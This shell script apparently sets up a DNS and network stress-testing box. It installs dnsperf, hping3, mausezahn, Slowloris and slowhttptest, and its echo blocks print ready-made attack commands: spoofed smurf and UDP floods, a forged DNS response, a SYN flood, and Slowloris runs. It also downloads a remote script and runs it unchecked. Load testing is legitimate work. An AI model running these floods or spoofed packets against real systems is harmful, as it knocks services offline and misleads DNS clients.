#!/bin/sh
#
clear
echo "
 _____             _         _    _          _                                   
|     |___ ___ ___| |_ ___ _| |  | |_ _ _   |_|                                  
|   --|  _| -_| .'|  _| -_| . |  | . | | |   _                                   
|_____|_| |___|__,|_| |___|___|  |___|_  |  |_|                                  
                                     |___|                                       
                                                                                 
 _____ _       _     _           _              _____    __    _____             
|     | |_ ___|_|___| |_ ___ ___| |_ ___ ___   |     |__|  |  |   __|___ ___ _ _ 
|   --|   |  _| |_ -|  _| . | . |   | -_|  _|  | | | |  |  |  |  |  |  _| .'| | |
|_____|_|_|_| |_|___|_| |___|  _|_|_|___|_|    |_|_|_|_____|  |_____|_| |__,|_  |
                            |_|                                             |___|

\r\n \r\n
Version:  0.0.27
Last Updated:  4/15/2020


Updating system first..."
sudo -E apt-get update
wait
sudo -E apt-get upgrade -y
wait
echo "Downloading required dependencies...\r\n\r\n"
#--------------------------------------------------------------------------------------------


sudo -E apt-get install -y bind9utils libbind-dev libkrb5-dev libssl-dev libcap-dev libxml2-dev libjson-c-dev libgeoip-dev make parallel htop speedometer tcpdump libpcap curl nmap
sudo -E apt-get install -y libprotobuf-c-dev libfstrm-dev liblmdb-dev libssl-dev iproute

#--- Install NEW DNSPerf 2020  https://www.dns-oarc.net/tools/dnsperf  ---
curl -o "dnsperf.tar.gz" https://www.dns-oarc.net/files/dnsperf/dnsperf-2.3.2.tar.gz
tar zxvf dnsperf.tar.gz
cd dnsperf-2.3.2/
./configure
make
make install
dnsperf -h

echo "Download Sample DNS Data.. 

"
cd ..
wget -O "queryfile-example-10million.gz" "https://www.dns-oarc.net/files/dnsperf/data/queryfile-example-10million-201202.gz"
gunzip queryfile-example-10million.gz


#----- Install DNSPerf ----------
# https://www.nominum.com/measurement-tools/
#sudo -E apt-get install -y bind9utils libbind-dev libkrb5-dev libssl-dev libcap-dev libxml2-dev libjson-c-dev libgeoip-dev make parallel

#if [ -f dnsperf-src-2.1.0.0-1.tar.gz ]; then
#    rm dnsperf-src-2.1.0.0-1.tar.gz
#fi
#if [ -d dnsperf-src-2.1.0.0-1 ]; then
#    rm -r dnsperf-src-2.1.0.0-1/
#fi

#curl ftp://ftp.nominum.com/pub/nominum/dnsperf/2.1.0.0/dnsperf-src-2.1.0.0-1.tar.gz -O
#tar xfvz dnsperf-src-2.1.0.0-1.tar.gz
#cd dnsperf-src-2.1.0.0-1
#./configure
#make clean
#make
#sudo make install
#wait
#dnsperf -h
#cd ..
#rm dnsperf-src-2.1.0.0-1.tar.gz
#--- download latest Queryfile from Nominum ---
#if [ -f queryfile-example-current.gz ]; then
#    rm queryfile-example-current.gz
#fi
#wget -O "queryfile-example-current.gz" "ftp://ftp.nominum.com/pub/nominum/dnsperf/data/queryfile-example-current.gz"
#gunzip queryfile-example-current.gz

#------- Apache Bench ------------
sudo -E apt-get install -y apache2-utils

#-------------------- HPING ---------------------
sudo -E apt-get install -y nload traceroute hping3 tcl8.6
wait

### Examples ###
# https://pentest.blog/how-to-perform-ddos-test-as-a-pentester/
# https://www.slideshare.net/Himani-Singh/type-of-ddos-attacks-with-hping3-example

echo "  \r\n \r\n \r\n
DNS smurf Attack:  hping3 --icmp --spoof TARGET_IP BROADCAST_IP    \r\n
hping3 192.168.1.1 -I eth2 -q -n --udp -d 110 -p 53 --flood --rand-source  \r\n
hping3 10.1.1.13 --rand-dest -I eth1 --udp -q -d 80 -p 53 --faster -c 400   \r\n
hping3 10.1.1.13 -I eth0 --udp -p 53 --i u1000  \r\n

\r\n \r\n
"

#--- MZ tool
# http://linuxpoison.blogspot.in/2010/01/mz-mausezahn-network-traffic-generation.html
echo "Installing MZ tool \r\n "
sudo -E apt-get -y install mz

#-- usage
echo "\r\n \r\n Usage: mz -A rand -B TARGET_DNS_SERVER -t dns \"q=pentest.blog\" -c 10000000 \r\n "
echo " Here we showed the source rope as 5.5.5.5 and sent 1000 packets to 1.2.39.40. We are provided with a novelty to generate random DNS queries. \r\n \r\n 
mz -A 5.5.5.5 -B 1.2.39.40 -t dns \“q=google.com\” -c 1000 \r\n
\r\n
Using Mausezahn: \r\n
Send an arbitrary sequence of bytes through your network card 1000 times: \r\n
mz eth0 -c 1000 \"ff:ff:ff:ff:ff:ff ff:ff:ff:ff:ff:ff cc:dd 00:00:00:ca:fe:ba:be\" \r\n
\r\n

You can send more complex packets easily with the built-in packet builders using the -t option. Let's send a forged DNS response to host 192.168.1.2 by impersonating the DNS server x.x.x.x:   \r\n
mz eth0  -A x.x.x.x -B 192.168.1.2 -t dns \"q=www.xxxxxxxx.com, a=172.16.6.66\" . \r\n
\r\n

Perform a TCP SYN-Flood attack against all hosts in subnet 10.5.5.0/24  \r\n
mz eth0 -c 0 -Q 50,100 -A rand -B 10.5.5.0/25 -t tcp \"flags=syn, dp=1-1023\"

\r\n \r\n
"

#---- Python tools ---
sudo apt-get -y install python-mechanize

# Install Python3 
wget https://raw.githubusercontent.com/c2theg/srvBuilds/master/install_python3.sh && chmod u+x install_python3.sh && ./install_python3.sh
wait
sleep 2

pip3 install dnspython
pip3 install --pre scapy[complete]
pip3 install mechanize
pip3 install paramiko

#--- Slowloris
echo "\r\n \r\n Downloading Slowloris... \r\n "
# https://github.com/llaera/slowloris.pl
sudo -E apt-get -y install perl libwww-mechanize-shell-perl perl-mechanize

if [ -f slowloris.pl ]; then
    rm slowloris.pl
fi
wget https://raw.githubusercontent.com/llaera/slowloris.pl/master/slowloris.pl && chmod u+x slowloris.pl
#./slowloris.pl
echo "
Usage: \r\n
perl slowloris.pl -dns (Victim URL or IP) -options \r\n
./slowloris.pl -dns TARGET_URL -port 443 -timeout 30 -num 200 -https \r\n
./slowloris.pl -dns TARGET_URL -port 80 -num 200   \r\n
"

#--- SlowHTTPtest
#  https://github.com/shekyan/slowhttptest/wiki/InstallationAndUsage
#wget -O "slowhttptest-1.7.tar.gz" "https://github.com/shekyan/slowhttptest/archive/v1.7.tar.gz"
#tar -xzvf slowhttptest-1.7.tar.gz
#cd slowhttptest-1.7
#./configure --prefix=PREFIX
#make
#sudo make install
#--- ubuntu repo ----
sudo -E apt-get install -y slowhttptest
#---------------------------------------------------------
#sh ./update_attacks.sh

echo "All items done installing!!! \r\n \r\n "
echo "To generate VALID DNS traffic run the following script:  ./gen_data.sh "
echo "\r\n \r\n"
